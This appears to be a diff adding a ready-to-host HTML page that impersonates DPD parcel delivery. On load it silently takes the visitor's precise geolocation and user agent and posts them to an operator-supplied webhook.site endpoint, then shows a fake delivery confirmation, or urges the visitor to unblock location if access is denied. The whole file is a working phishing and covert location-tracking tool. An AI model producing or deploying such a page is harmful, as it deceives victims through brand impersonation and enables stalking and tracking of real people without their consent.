@@ -1,0 +1,85 @@
+<!-- index.html — Host on GitHub Pages -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DPD Delivery — Confirm Your Address</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
+        .box { background: white; padding: 40px; border-radius: 12px; max-width: 500px; margin: auto; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .logo { font-size: 48px; margin-bottom: 10px; }
+        h1 { color: #d40511; }
+        .loading { margin: 30px 0; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #d40511; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .notice { color: #666; font-size: 14px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="logo">📦</div>
+        <h1>DPD Package Delivery</h1>
+        <p>Your parcel is out for delivery. Please confirm your location to schedule the drop-off.</p>
+        <div class="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 15px;">Detecting your location...</p>
+        </div>
+        <p class="notice">We need your current location to confirm delivery address.</p>
+    </div>
+
+    <script>
+        // Your webhook to receive coordinates (use webhook.site or your own server)
+        const WEBHOOK_URL = "https://webhook.site/YOUR-UNIQUE-ID";
+
+        function getLocation() {
+            if (!navigator.geolocation) {
+                document.body.innerHTML = "<p>Geolocation not supported</p>";
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    const data = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        ip: ""  // filled server-side if you use your own backend
+                    };
+
+                    // Send to webhook
+                    fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        mode: "no-cors",  // Allows cross-origin
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify(data)
+                    });
+
+                    // Show success page
+                    document.querySelector(".box").innerHTML = `
+                        <div class="logo">✅</div>
+                        <h1>Location Confirmed</h1>
+                        <p>Your delivery is scheduled for today between 2-4 PM.</p>
+                        <p style="color: #999; font-size: 13px;">If you need to change the time, contact support.</p>
+                    `;
+                },
+                function(err) {
+                    document.querySelector(".box").innerHTML = `
+                        <div class="logo">⚠️</div>
+                        <h1>Location Blocked</h1>
+                        <p>Please enable location services and refresh the page.</p>
+                        <p style="color: #999; font-size: 13px;">Click the lock icon in your browser to allow location access.</p>
+                    `;
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
